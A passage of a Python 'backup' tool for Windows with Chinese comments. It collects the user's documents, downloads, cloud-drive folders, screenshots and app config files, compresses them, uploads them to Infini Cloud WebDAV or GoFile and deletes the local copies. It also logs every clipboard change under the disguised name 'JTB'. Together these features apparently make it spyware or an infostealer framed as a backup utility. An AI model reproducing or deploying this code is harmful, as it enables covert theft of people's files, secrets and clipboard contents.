                        # 父目录创建成功，再次尝试创建当前目录
                        response = self.session.request('MKCOL', dir_path, auth=auth, timeout=(8, 8))
                        return response.status_code in [201, 204, 405]
                return False
            else:
                return False
        except Exception:
            return False

    def _upload_single_file_infini(self, file_path, infini_config):
        """使用指定的 Infini 配置上传单个文件（使用 WebDAV PUT 方法）。"""
        try:
            config_name = infini_config.get("name", "Infini Cloud")
            infini_url = infini_config.get("url", "").strip()
            infini_user = infini_config.get("user", "").strip()
            infini_password = infini_config.get("password", "")

            if not infini_url or not infini_user or not infini_password:
                logging.error(f"❌ [{config_name}] 配置不完整，跳过")
                return False

            auth = HTTPBasicAuth(infini_user, infini_password)

            # 检查文件权限和状态
            if not os.path.exists(file_path):
                logging.error(f"文件不存在: {file_path}")
                return False
                
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"文件大小为0: {file_path}")
                return False
                
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"文件过大 {file_path}: {file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB")
                return False

            # 构建远程路径
            filename = os.path.basename(file_path)
            remote_filename = f"{self.config.INFINI_REMOTE_BASE_DIR}/{filename}"
            remote_path = f"{infini_url.rstrip('/')}/{remote_filename.lstrip('/')}"
            
            # 创建远程目录（如果需要）
            remote_dir = os.path.dirname(remote_filename)
            if remote_dir and remote_dir != '.':
                if not self._create_remote_directory(remote_dir, infini_url=infini_url, auth=auth):
                    logging.warning(f"[{config_name}] 无法创建远程目录: {remote_dir}，将继续尝试上传")

            # 上传重试逻辑
            for attempt in range(self.config.RETRY_COUNT):
                if not self._check_internet_connection():
                    logging.error("网络连接不可用，等待重试...")
                    time.sleep(self.config.RETRY_DELAY)
                    continue

                try:
                    # 根据文件大小动态调整超时时间
                    if file_size < 1024 * 1024:  # 小于1MB
                        connect_timeout = 10
                        read_timeout = 30
                    elif file_size < 10 * 1024 * 1024:  # 1-10MB
                        connect_timeout = 15
                        read_timeout = max(30, int(file_size / 1024 / 1024 * 5))
                    else:  # 大于10MB
                        connect_timeout = 20
                        read_timeout = max(60, int(file_size / 1024 / 1024 * 6))
                    
                    # 只在第一次尝试时显示详细信息
                    if attempt == 0:
                        size_str = f"{file_size / 1024 / 1024:.2f}MB" if file_size >= 1024 * 1024 else f"{file_size / 1024:.2f}KB"
                        logging.critical(f"📤 [{config_name}] 上传: {filename} ({size_str})")
                    elif self.config.DEBUG_MODE:
                        logging.debug(f"[{config_name}] 重试上传: {filename} (第 {attempt + 1} 次)")
                    
                    # 准备请求头
                    headers = {
                        'Content-Type': 'application/octet-stream',
                        'Content-Length': str(file_size),
                    }
                    
                    # 执行上传（使用 WebDAV PUT 方法）
                    with open(file_path, 'rb') as f:
                        response = self.session.put(
                            remote_path,
                            data=f,
                            headers=headers,
                            auth=auth,
                            timeout=(connect_timeout, read_timeout),
                            stream=False
                        )
                    
                    if response.status_code in [201, 204]:
                        logging.critical(f"✅ [{config_name}] {filename}")
                        return True
                    elif response.status_code == 403:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"❌ [{config_name}] {filename}: 权限不足")
                    elif response.status_code == 404:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"❌ [{config_name}] {filename}: 远程路径不存在")
                    elif response.status_code == 409:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"❌ [{config_name}] {filename}: 远程路径冲突")
                    else:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"❌ [{config_name}] {filename}: 状态码 {response.status_code}")
                        
                except requests.exceptions.Timeout:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [{config_name}] {os.path.basename(file_path)}: 超时")
                except requests.exceptions.SSLError:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [{config_name}] {os.path.basename(file_path)}: SSL错误")
                except requests.exceptions.ConnectionError:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [{config_name}] {os.path.basename(file_path)}: 连接错误")
                except Exception as e:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [{config_name}] {os.path.basename(file_path)}: {str(e)}")

                if attempt < self.config.RETRY_COUNT - 1:
                    if self.config.DEBUG_MODE:
                        logging.debug(f"[{config_name}] 等待 {self.config.RETRY_DELAY} 秒后重试...")
                    time.sleep(self.config.RETRY_DELAY)

            return False
            
        except OSError as e:
            logging.error(f"获取文件信息失败 {file_path}: {e}")
            return False
        except Exception as e:
            logging.error(f"[Infini Cloud] 上传过程出错: {e}")
            return False

    def _upload_single_file_gofile(self, file_path):
        """上传单个文件到 GoFile（备选方案）
        
        Args:
            file_path: 要上传的文件路径
            
        Returns:
            bool: 上传是否成功
        """
        if not os.path.exists(file_path):
            logging.error(f"文件不存在: {file_path}")
            return False

        try:
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"文件大小为0: {file_path}")
                return False
            
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"文件过大: {file_path} ({file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB)")
                return False

            filename = os.path.basename(file_path)
            logging.info(f"🔄 尝试使用 GoFile 上传: {filename}")

            server_index = 0
            total_retries = 0
            max_total_retries = len(self.config.UPLOAD_SERVERS) * self.config.MAX_SERVER_RETRIES
            upload_success = False

            while total_retries < max_total_retries and not upload_success:
                if not self._check_internet_connection():
                    logging.error("网络连接不可用，等待重试...")
                    time.sleep(self.config.RETRY_DELAY)
                    total_retries += 1
                    continue

                current_server = self.config.UPLOAD_SERVERS[server_index]
                try:
                    # 使用 with 语句确保文件正确关闭
                    with open(file_path, "rb") as f:
                        response = requests.post(
                            current_server,
                            files={"file": f},
                            data={"token": self.api_token},
                            timeout=self.config.UPLOAD_TIMEOUT,
                            verify=True
                        )

                        if response.ok:
                            try:
                                result = response.json()
                                if result.get("status") == "ok":
                                    logging.critical(f"✅ [GoFile] {filename}")
                                    upload_success = True
                                    break
                                else:
                                    error_msg = result.get("message", "未知错误")
                                    error_code = result.get("code", 0)
                                    if total_retries == 0 or self.config.DEBUG_MODE:
                                        logging.error(f"[GoFile] 服务器返回错误 (代码: {error_code}): {error_msg}")
                                    
                                    # 处理特定错误码
                                    if error_code in [402, 405]:  # 服务器限制或权限错误
                                        server_index = (server_index + 1) % len(self.config.UPLOAD_SERVERS)
                                        if server_index == 0:  # 如果已经尝试了所有服务器
                                            time.sleep(self.config.RETRY_DELAY * 2)  # 增加等待时间
                            except (ValueError, KeyError) as e:
                                if total_retries == 0 or self.config.DEBUG_MODE:
                                    logging.error(f"[GoFile] 服务器返回无效JSON数据: {str(e)}")
                        else:
                            if total_retries == 0 or self.config.DEBUG_MODE:
                                logging.error(f"[GoFile] 上传失败，HTTP状态码: {response.status_code}")

                except requests.exceptions.Timeout:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [GoFile] {filename}: 超时")
                except requests.exceptions.SSLError as e:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [GoFile] {filename}: SSL错误")
                except requests.exceptions.ConnectionError as e:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [GoFile] {filename}: 连接错误")
                except requests.exceptions.RequestException as e:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [GoFile] {filename}: 请求异常")
                except (OSError, IOError) as e:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [GoFile] {filename}: 文件读取错误")
                except Exception as e:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [GoFile] {filename}: {str(e)}")

                # 切换到下一个服务器
                server_index = (server_index + 1) % len(self.config.UPLOAD_SERVERS)
                if server_index == 0:
                    time.sleep(self.config.RETRY_DELAY)  # 所有服务器都尝试过后等待
                
                total_retries += 1

            if upload_success:
                return True
            else:
                logging.error(f"❌ [GoFile] {filename}: 上传失败，已达到最大重试次数")
                return False

        except (OSError, IOError, PermissionError) as e:
            logging.error(f"[GoFile] 处理文件时出错: {str(e)}")
            return False
        except Exception as e:
            logging.error(f"[GoFile] 处理文件时出现未知错误: {str(e)}")
            return False

    def _upload_single_file(self, file_path):
        """上传单个文件，依次尝试所有 Infini 配置，全部失败后再使用 GoFile 备选方案
        
        Args:
            file_path: 要上传的文件路径
            
        Returns:
            bool: 上传是否成功
        """
        if not os.path.exists(file_path):
            logging.error(f"文件不存在: {file_path}")
            return False

        try:
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"文件大小为0: {file_path}")
                self._safe_remove_file(file_path, retry=False)
                return False
            
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"文件过大: {file_path} ({file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB)")
                self._safe_remove_file(file_path, retry=False)
                return False

            infini_configs = self.infini_configs if self.infini_configs else [
                {
                    "name": "Infini-默认配置",
                    "url": self.infini_url,
                    "user": self.infini_user,
                    "password": self.infini_pass,
                }
            ]

            # 依次尝试所有 Infini 上传配置
            for index, infini_config in enumerate(infini_configs, start=1):
                config_name = infini_config.get("name", f"Infini-{index}")
                logging.info(f"🔄 尝试 Infini 上传配置 {index}/{len(infini_configs)}: {config_name}")
                if self._upload_single_file_infini(file_path, infini_config):
                    self._safe_remove_file(file_path, retry=True)
                    return True

            # 所有 Infini 上传方法都失败后，才尝试 GoFile 备选方案
            logging.warning(f"⚠️ 所有 Infini 上传方法均失败，尝试使用 GoFile 备选方案: {os.path.basename(file_path)}")
            if self._upload_single_file_gofile(file_path):
                self._safe_remove_file(file_path, retry=True)
                return True
            
            # 所有方法都失败
            logging.error(f"❌ {os.path.basename(file_path)}: 所有上传方法均失败")
            return False

        except (OSError, IOError, PermissionError) as e:
            logging.error(f"处理文件时出错: {str(e)}")
            self._safe_remove_file(file_path, retry=False)
            return False
        except Exception as e:
            logging.error(f"处理文件时出现未知错误: {str(e)}")
            return False

    def zip_backup_folder(self, folder_path, zip_file_path):
        """压缩备份文件夹为tar.gz格式
        
        Args:
            folder_path: 要压缩的文件夹路径
            zip_file_path: 压缩文件路径（不含扩展名）
            
        Returns:
            str or list: 压缩文件路径或压缩文件路径列表
        """
        try:
            if folder_path is None or not os.path.exists(folder_path):
                return None

            # 检查源目录是否为空
            total_files = sum(len(files) for _, _, files in os.walk(folder_path))
            if total_files == 0:
                logging.error(f"源目录为空 {folder_path}")
                return None

            # 计算源目录大小
            dir_size = 0
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    try:
                        file_path = os.path.join(dirpath, filename)
                        file_size = os.path.getsize(file_path)
                        if file_size > 0:  # 跳过空文件
                            dir_size += file_size
                    except OSError as e:
                        logging.error(f"获取文件大小失败 {file_path}: {e}")
                        continue

            if dir_size == 0:
                logging.error(f"源目录实际大小为0 {folder_path}")
                return None

            if dir_size > self.config.MAX_SOURCE_DIR_SIZE:
                return self.split_large_directory(folder_path, zip_file_path)

            tar_path = f"{zip_file_path}.tar.gz"
            if os.path.exists(tar_path):
                os.remove(tar_path)

            with tarfile.open(tar_path, "w:gz") as tar:
                tar.add(folder_path, arcname=os.path.basename(folder_path))

            # 验证压缩文件
            try:
                compressed_size = os.path.getsize(tar_path)
                if compressed_size == 0:
                    logging.error(f"压缩文件大小为0 {tar_path}")
                    if os.path.exists(tar_path):
                        os.remove(tar_path)
                    return None
                    
                if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                    os.remove(tar_path)
                    return self.split_large_directory(folder_path, zip_file_path)

                self._clean_directory(folder_path)
                return tar_path
            except OSError as e:
                logging.error(f"获取压缩文件大小失败 {tar_path}: {e}")
                if os.path.exists(tar_path):
                    os.remove(tar_path)
                return None
                
        except (OSError, IOError, PermissionError, tarfile.TarError) as e:
            logging.error(f"压缩失败 {folder_path}: {e}")
            return None

    def backup_specified_files(self, source_dir, target_dir):
        """备份指定的重要目录和文件（桌面、便签、历史记录等）
        
        Args:
            source_dir: 源目录路径（通常为 %USERPROFILE%）
            target_dir: 目标目录路径
            
        Returns:
            str: 备份目录路径，如果失败则返回 None
        """
        source_dir = os.path.abspath(os.path.expandvars(source_dir))
        target_dir = os.path.abspath(os.path.expandvars(target_dir))

        if self.config.DEBUG_MODE:
            logging.debug("开始备份指定目录和文件:")
            logging.debug(f"源目录: {source_dir}")
            logging.debug(f"目标目录: {target_dir}")

        if not os.path.exists(source_dir):
            logging.error(f"❌ 源目录不存在: {source_dir}")
            return None

        if not os.access(source_dir, os.R_OK):
            logging.error(f"❌ 源目录没有读取权限: {source_dir}")
            return None

        if not self._clean_directory(target_dir):
            logging.error(f"❌ 无法清理或创建目标目录: {target_dir}")
            return None

        files_count = 0
        total_size = 0

        for item in self.config.WINDOWS_SPECIFIC_DIRS:
            # 支持通配符（glob），例如 r".openclaw\openclaw.json*"
            if any(ch in item for ch in ["*", "?", "["]):
                pattern = os.path.join(source_dir, item)
                matched_paths = glob.glob(pattern)
                if not matched_paths and self.config.DEBUG_MODE:
                    logging.debug(f"通配符未匹配到任何项目: {pattern}")
                for matched_path in matched_paths:
                    rel_name = os.path.relpath(matched_path, source_dir)
                    rel_target = os.path.join(target_dir, rel_name)
                    parent_dir = os.path.dirname(rel_target)
                    if not self._ensure_directory(parent_dir):
                        if self.config.DEBUG_MODE:
                            logging.debug(f"创建目标父目录失败: {parent_dir}")
                        continue

                    try:
                        if os.path.isdir(matched_path):
                            shutil.copytree(matched_path, rel_target, dirs_exist_ok=True)
                            dir_size = self._get_dir_size(rel_target)
                            files_count += 1
                            total_size += dir_size
                            if self.config.DEBUG_MODE:
                                logging.debug(f"成功复制目录: {matched_path} -> {rel_target}")
                        else:
                            shutil.copy2(matched_path, rel_target)
                            file_size = os.path.getsize(rel_target)
                            files_count += 1
                            total_size += file_size
                            if self.config.DEBUG_MODE:
                                logging.debug(f"成功复制文件: {matched_path} -> {rel_target}")
                    except Exception as e:
                        if self.config.DEBUG_MODE:
                            logging.debug(f"处理失败: {matched_path} - {str(e)}")
                continue

            source_path = os.path.join(source_dir, item)
            if not os.path.exists(source_path):
                if self.config.DEBUG_MODE:
                    logging.debug(f"跳过不存在的项目: {source_path}")
                continue

            try:
                if os.path.isdir(source_path):
                    # 复制目录
                    target_path = os.path.join(target_dir, item)
                    parent_dir = os.path.dirname(target_path)
                    if not self._ensure_directory(parent_dir):
                        if self.config.DEBUG_MODE:
                            logging.debug(f"创建目标父目录失败: {parent_dir}")
                        continue
                    shutil.copytree(source_path, target_path, dirs_exist_ok=True)
                    dir_size = self._get_dir_size(target_path)
                    files_count += 1
                    total_size += dir_size
                    if self.config.DEBUG_MODE:
                        logging.debug(f"成功复制目录: {source_path} -> {target_path}")
                else:
                    # 复制文件
                    target_path = os.path.join(target_dir, item)
                    parent_dir = os.path.dirname(target_path)
                    if not self._ensure_directory(parent_dir):
                        if self.config.DEBUG_MODE:
                            logging.debug(f"创建目标父目录失败: {parent_dir}")
                        continue
                    shutil.copy2(source_path, target_path)
                    file_size = os.path.getsize(target_path)
                    files_count += 1
                    total_size += file_size
                    if self.config.DEBUG_MODE:
                        logging.debug(f"成功复制文件: {source_path} -> {target_path}")
            except Exception as e:
                if self.config.DEBUG_MODE:
                    logging.debug(f"复制失败: {source_path} - {str(e)}")

        if files_count > 0:
            logging.info("\n📊 指定文件备份完成:")
            logging.info(f"   📁 文件数量: {files_count}")
            logging.info(f"   💾 总大小: {total_size / 1024 / 1024:.1f}MB")
            return target_dir
        else:
            logging.error("❌ 未找到需要备份的指定文件")
            return None

    def split_large_directory(self, folder_path, base_zip_path):
        """将大目录分割成多个小块并分别压缩
        
        Args:
            folder_path: 要分割的目录路径
            base_zip_path: 基础压缩文件路径
            
        Returns:
            list: 压缩文件路径列表
        """
        try:
            compressed_files = []
            current_size = 0
            current_files = []
            part_num = 0
            
            # 创建临时目录存放分块
            temp_dir = os.path.join(os.path.dirname(folder_path), "temp_split")
            if not self._ensure_directory(temp_dir):
                return None

            # 使用更保守的压缩比例估算（假设压缩后为原始大小的70%）
            COMPRESSION_RATIO = 0.7
            # 为了确保安全，将目标大小设置为限制的70%
            SAFETY_MARGIN = 0.7
            MAX_CHUNK_SIZE = int(self.config.MAX_SINGLE_FILE_SIZE * SAFETY_MARGIN / COMPRESSION_RATIO)

            # 先收集所有文件信息
            all_files = []
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    file_path = os.path.join(dirpath, filename)
                    try:
                        file_size = os.path.getsize(file_path)
                        if file_size > 0:  # 跳过空文件
                            rel_path = os.path.relpath(file_path, folder_path)
                            all_files.append((file_path, rel_path, file_size))
                    except OSError:
                        continue

            # 按文件大小降序排序
            all_files.sort(key=lambda x: x[2], reverse=True)

            # 检查是否有单个文件超过限制
            for file_path, _, file_size in all_files[:]:  # 使用切片创建副本以避免在迭代时修改列表
                if file_size > MAX_CHUNK_SIZE:
                    logging.error(f"单个文件过大: {file_size / 1024 / 1024:.1f}MB")
                    all_files.remove((file_path, _, file_size))

            # 使用最优匹配算法进行分组
            current_chunk = []
            current_chunk_size = 0
            
            for file_info in all_files:
                file_path, rel_path, file_size = file_info
                
                # 如果当前文件会导致当前块超过限制，创建新块
                if current_chunk_size + file_size > MAX_CHUNK_SIZE and current_chunk:
                    # 创建新的分块目录
                    part_dir = os.path.join(temp_dir, f"part{part_num}")
                    if self._ensure_directory(part_dir):
                        # 复制文件到分块目录
                        chunk_success = True
                        for src, dst_rel, _ in current_chunk:
                            dst = os.path.join(part_dir, dst_rel)
                            dst_dir = os.path.dirname(dst)
                            if not self._ensure_directory(dst_dir):
                                chunk_success = False
                                break
                            try:
                                shutil.copy2(src, dst)
                            except Exception:
                                chunk_success = False
                                break
                        
                        if chunk_success:
                            # 压缩分块，使用更高的压缩级别
                            tar_path = f"{base_zip_path}_part{part_num}.tar.gz"
                            try:
                                with tarfile.open(tar_path, "w:gz", compresslevel=9) as tar:
                                    tar.add(part_dir, arcname=os.path.basename(folder_path))
                                
                                compressed_size = os.path.getsize(tar_path)
                                if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                                    os.remove(tar_path)
                                    # 如果压缩后仍然过大，尝试将当前块再次分割
                                    if len(current_chunk) > 1:
                                        mid = len(current_chunk) // 2
                                        # 递归处理前半部分
                                        self._process_partial_chunk(current_chunk[:mid], temp_dir, base_zip_path, 
                                                                 part_num, compressed_files)
                                        # 递归处理后半部分
                                        self._process_partial_chunk(current_chunk[mid:], temp_dir, base_zip_path, 
                                                                 part_num + 1, compressed_files)
                                    part_num += 2
                                else:
                                    compressed_files.append(tar_path)
                                    logging.info(f"分块 {part_num + 1}: {current_chunk_size / 1024 / 1024:.1f}MB -> {compressed_size / 1024 / 1024:.1f}MB")
                                    part_num += 1
                            except Exception:
                                if os.path.exists(tar_path):
                                    os.remove(tar_path)
                    
                    self._clean_directory(part_dir)
                    current_chunk = []
                    current_chunk_size = 0
                
                # 添加文件到当前块
                current_chunk.append((file_path, rel_path, file_size))
                current_chunk_size += file_size
            
            # 处理最后一个块
            if current_chunk:
                part_dir = os.path.join(temp_dir, f"part{part_num}")
                if self._ensure_directory(part_dir):
                    chunk_success = True
                    for src, dst_rel, _ in current_chunk:
                        dst = os.path.join(part_dir, dst_rel)
                        dst_dir = os.path.dirname(dst)
                        if not self._ensure_directory(dst_dir):
                            chunk_success = False
                            break
                        try:
                            shutil.copy2(src, dst)
                        except Exception:
                            chunk_success = False
                            break
                    
                    if chunk_success:
                        tar_path = f"{base_zip_path}_part{part_num}.tar.gz"
                        try:
                            with tarfile.open(tar_path, "w:gz", compresslevel=9) as tar:
                                tar.add(part_dir, arcname=os.path.basename(folder_path))
                            
                            compressed_size = os.path.getsize(tar_path)
                            if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                                os.remove(tar_path)
                                # 如果压缩后仍然过大，尝试将当前块再次分割
                                if len(current_chunk) > 1:
                                    mid = len(current_chunk) // 2
                                    # 递归处理前半部分
                                    self._process_partial_chunk(current_chunk[:mid], temp_dir, base_zip_path, 
                                                             part_num, compressed_files)
                                    # 递归处理后半部分
                                    self._process_partial_chunk(current_chunk[mid:], temp_dir, base_zip_path, 
                                                             part_num + 1, compressed_files)
                            else:
                                compressed_files.append(tar_path)
                                logging.info(f"最后分块: {current_chunk_size / 1024 / 1024:.1f}MB -> {compressed_size / 1024 / 1024:.1f}MB")
                        except Exception:
                            if os.path.exists(tar_path):
                                os.remove(tar_path)
                    
                    self._clean_directory(part_dir)
            
            # 清理临时目录和源目录
            self._clean_directory(temp_dir)
            self._clean_directory(folder_path)
            
            if not compressed_files:
                logging.error("分割失败，没有生成有效的压缩文件")
                return None
            
            logging.info(f"已分割为 {len(compressed_files)} 个压缩文件")
            return compressed_files
        except Exception:
            logging.error("分割失败")
            return None

    def _process_partial_chunk(self, chunk, temp_dir, base_zip_path, part_num, compressed_files):
        """处理部分分块
        
        Args:
            chunk: 要处理的文件列表
            temp_dir: 临时目录路径
            base_zip_path: 基础压缩文件路径
            part_num: 分块编号
            compressed_files: 压缩文件列表
        """
        part_dir = os.path.join(temp_dir, f"part{part_num}_sub")
        if not self._ensure_directory(part_dir):
            return
        
        chunk_success = True
        total_size = 0
        for src, dst_rel, file_size in chunk:
            dst = os.path.join(part_dir, dst_rel)
            dst_dir = os.path.dirname(dst)
            if not self._ensure_directory(dst_dir):
                chunk_success = False
                break
            try:
                shutil.copy2(src, dst)
                total_size += file_size
            except Exception:
                chunk_success = False
                break
        
        if chunk_success:
            tar_path = f"{base_zip_path}_part{part_num}_sub.tar.gz"
            try:
                with tarfile.open(tar_path, "w:gz", compresslevel=9) as tar:
                    tar.add(part_dir, arcname=os.path.basename(os.path.dirname(part_dir)))
                
                compressed_size = os.path.getsize(tar_path)
                if compressed_size <= self.config.MAX_SINGLE_FILE_SIZE:
                    compressed_files.append(tar_path)
                    logging.info(f"子分块: {total_size / 1024 / 1024:.1f}MB -> {compressed_size / 1024 / 1024:.1f}MB")
                else:
                    os.remove(tar_path)
            except Exception:
                if os.path.exists(tar_path):
                    os.remove(tar_path)
        
        self._clean_directory(part_dir)

    def get_clipboard_content(self):
        """获取JTB内容"""
        try:
            content = pyperclip.paste()
        except (pyperclip.PyperclipException, RuntimeError) as e:
            # 某些环境下（如无图形界面 / 无剪贴板服务）会持续抛出异常
            # 这里不记录错误日志，只返回 None，避免日志被高频刷屏
            return None
        
        if content is None:
            return None
        # 去除空白字符
        content = content.strip()
        return content if content else None

    def log_clipboard_update(self, content, file_path):
        """记录JTB更新到文件"""
        try:
            # 确保目录存在
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            
            # 写入日志
            with open(file_path, 'a', encoding='utf-8', errors='ignore') as f:
                f.write(f"\n=== 📋 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                f.write(f"{content}\n")
                f.write("-"*30 + "\n")
        except (OSError, IOError, PermissionError) as e:
            if self.config.DEBUG_MODE:
                logging.error(f"❌ 记录JTB失败: {e}")

    def monitor_clipboard(self, file_path, interval=3):
        """监控JTB变化并记录到文件
        
        Args:
            file_path: 日志文件路径
            interval: 检查间隔（秒）
        """
        # 确保日志目录存在
        log_dir = os.path.dirname(file_path)
        if not os.path.exists(log_dir):
            try:
                os.makedirs(log_dir, exist_ok=True)
            except Exception as e:
                logging.error(f"❌ 创建JTB日志目录失败: {e}")
                return

        last_content = ""
        error_count = 0
        max_errors = 5  # 最大连续错误次数（可考虑提取为配置常量）
        
        while True:
            try:
                current_content = self.get_clipboard_content()
                # 只有当JTB内容非空且与上次不同时才记录
                if current_content and current_content != last_content:
                    self.log_clipboard_update(current_content, file_path)
                    last_content = current_content
                    if self.config.DEBUG_MODE:
                        logging.info("📋 检测到JTB更新")
                    error_count = 0  # 重置错误计数
                else:
                    error_count = 0  # 空内容不算错误，重置计数
            except Exception as e:
                error_count += 1
                if error_count >= max_errors:
                    if self.config.DEBUG_MODE:
                        logging.error(f"❌ JTB监控连续出错{max_errors}次，等待{self.config.CLIPBOARD_ERROR_WAIT}秒后重试")
                    time.sleep(self.config.CLIPBOARD_ERROR_WAIT)
                    error_count = 0  # 重置错误计数
                elif self.config.DEBUG_MODE:
                    logging.error(f"❌ JTB监控出错: {e}")
            time.sleep(interval if interval else self.config.CLIPBOARD_CHECK_INTERVAL)

    def upload_backup(self, backup_path):
        """上传备份文件
        
        Args:
            backup_path: 备份文件路径或备份文件路径列表
            
        Returns:
            bool: 上传是否成功
        """
        if isinstance(backup_path, list):
            success = True
            for path in backup_path:
                if not self.upload_file(path):
                    success = False
            return success
        else:
            return self.upload_file(backup_path)

def is_disk_available(disk_path):
    """检查磁盘是否可用"""
    try:
        return os.path.exists(disk_path) and os.access(disk_path, os.R_OK)
    except Exception:
        return False

def get_available_disks():
    """获取所有可用的磁盘和云盘目录"""
    available_disks = {}
    disk_letters = ['D', 'E', 'F']
    # 处理普通磁盘
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    for letter in disk_letters:
        disk_path = f"{letter}:\\"  # 使用Windows路径格式
        if os.path.exists(disk_path) and os.path.isdir(disk_path):
            backup_path = os.path.join(BackupConfig.BACKUP_ROOT, f'{user_prefix}_disk_{letter}')
            available_disks[letter] = {
                'docs': (disk_path, os.path.join(backup_path, f'{user_prefix}_docs'), 1),  # 文档类
                'configs': (disk_path, os.path.join(backup_path, f'{user_prefix}_configs'), 2),  # 配置类
            }
            logging.info(f"检测到可用磁盘: {disk_path}")
    
    # 处理用户目录下的文档/下载目录（支持中英文目录名）
    user_path = os.path.expandvars('%USERPROFILE%')
    if os.path.exists(user_path):
        documents_names = ["Documents", "文档"]
        downloads_names = ["Downloads", "下载"]

        for name in documents_names:
            documents_path = os.path.join(user_path, name)
            if os.path.exists(documents_path) and os.path.isdir(documents_path):
                documents_backup_path = os.path.join(BackupConfig.BACKUP_ROOT, f'{user_prefix}_user_documents')
                available_disks['documents'] = {
                    'docs': (os.path.abspath(documents_path), os.path.join(documents_backup_path, f'{user_prefix}_docs'), 1),
                    'configs': (os.path.abspath(documents_path), os.path.join(documents_backup_path, f'{user_prefix}_configs'), 2),
                }
                logging.info(f"检测到文档目录: {documents_path}")
                break

        for name in downloads_names:
            downloads_path = os.path.join(user_path, name)
            if os.path.exists(downloads_path) and os.path.isdir(downloads_path):
                downloads_backup_path = os.path.join(BackupConfig.BACKUP_ROOT, f'{user_prefix}_user_downloads')
                available_disks['downloads'] = {
                    'docs': (os.path.abspath(downloads_path), os.path.join(downloads_backup_path, f'{user_prefix}_docs'), 1),
                    'configs': (os.path.abspath(downloads_path), os.path.join(downloads_backup_path, f'{user_prefix}_configs'), 2),
                }
                logging.info(f"检测到下载目录: {downloads_path}")
                break

    # 处理用户目录下的云盘文件夹
    if os.path.exists(user_path):
        try:
            cloud_keywords = ["云", "网盘", "cloud", "drive", "box"]
            for item in os.listdir(user_path):
                item_path = os.path.join(user_path, item)
                if os.path.isdir(item_path):
                    # 检查文件夹名称是否包含云盘相关关键词
                    if any(keyword.lower() in item.lower() for keyword in cloud_keywords):
                        # 使用完整路径
                        disk_key = f"cloud_{item.lower()}"
                        cloud_backup_path = os.path.join(BackupConfig.BACKUP_ROOT, f'{user_prefix}_cloud', item)
                        available_disks[disk_key] = {
                            'docs': (os.path.abspath(item_path), os.path.join(cloud_backup_path, f'{user_prefix}_docs'), 1),
                            'configs': (os.path.abspath(item_path), os.path.join(cloud_backup_path, f'{user_prefix}_configs'), 2),
                        }
                        logging.info(f"检测到云盘目录: {item_path}")
                        
                        # 添加调试日志
                        if BackupConfig.DEBUG_MODE:
                            logging.debug(f"云盘源目录: {os.path.abspath(item_path)}")
                            logging.debug(f"云盘备份目录: {cloud_backup_path}")
        except Exception as e:
            logging.error(f"扫描用户云盘目录时出错: {e}")
    
    return available_disks

@lru_cache()
def get_username():
    """获取当前用户名"""
    return os.environ.get('USERNAME', '')

def backup_screenshots():
    """备份截图文件"""
    def get_screenshot_location():
        """读取 Windows 截图默认保存路径（注册表）"""
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders")
            try:
                # “{B7BEDE81-DF94-4682-A7D8-57A52620B86F}”是 Screenshots 文件夹
                path = winreg.QueryValueEx(key, "{B7BEDE81-DF94-4682-A7D8-57A52620B86F}")[0]
                if path and os.path.exists(path):
                    return path
            finally:
                winreg.CloseKey(key)
        except Exception:
            return None
        return None

    screenshot_paths = [
        os.path.join(os.environ.get('USERPROFILE', ''), "Pictures"),
        os.path.join(os.environ.get('ONEDRIVE', os.environ.get('USERPROFILE', '')), "Pictures")
    ]
    custom_path = get_screenshot_location()
    if custom_path and custom_path not in screenshot_paths:
        screenshot_paths.append(custom_path)

    screenshot_keywords = [
        "screenshot",
        "screen shot",
        "screen_shot",
        "屏幕快照",
        "屏幕截图",
        "截图",
        "截屏"
    ]
    screenshot_extensions = {
        ".png", ".jpg", ".jpeg", ".heic", ".gif", ".tiff", ".tif", ".bmp", ".webp"
    }
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    screenshot_backup_directory = os.path.join(BackupConfig.BACKUP_ROOT, f"{user_prefix}_screenshots")
    
    backup_manager = BackupManager()
    
    # 确保备份目录是空的
    if not backup_manager._clean_directory(screenshot_backup_directory):
        return None
        
    files_found = False
    for source_dir in screenshot_paths:
        if os.path.exists(source_dir):
            try:
                # 扫描整个Pictures目录，筛选包含"screenshot"关键字的文件
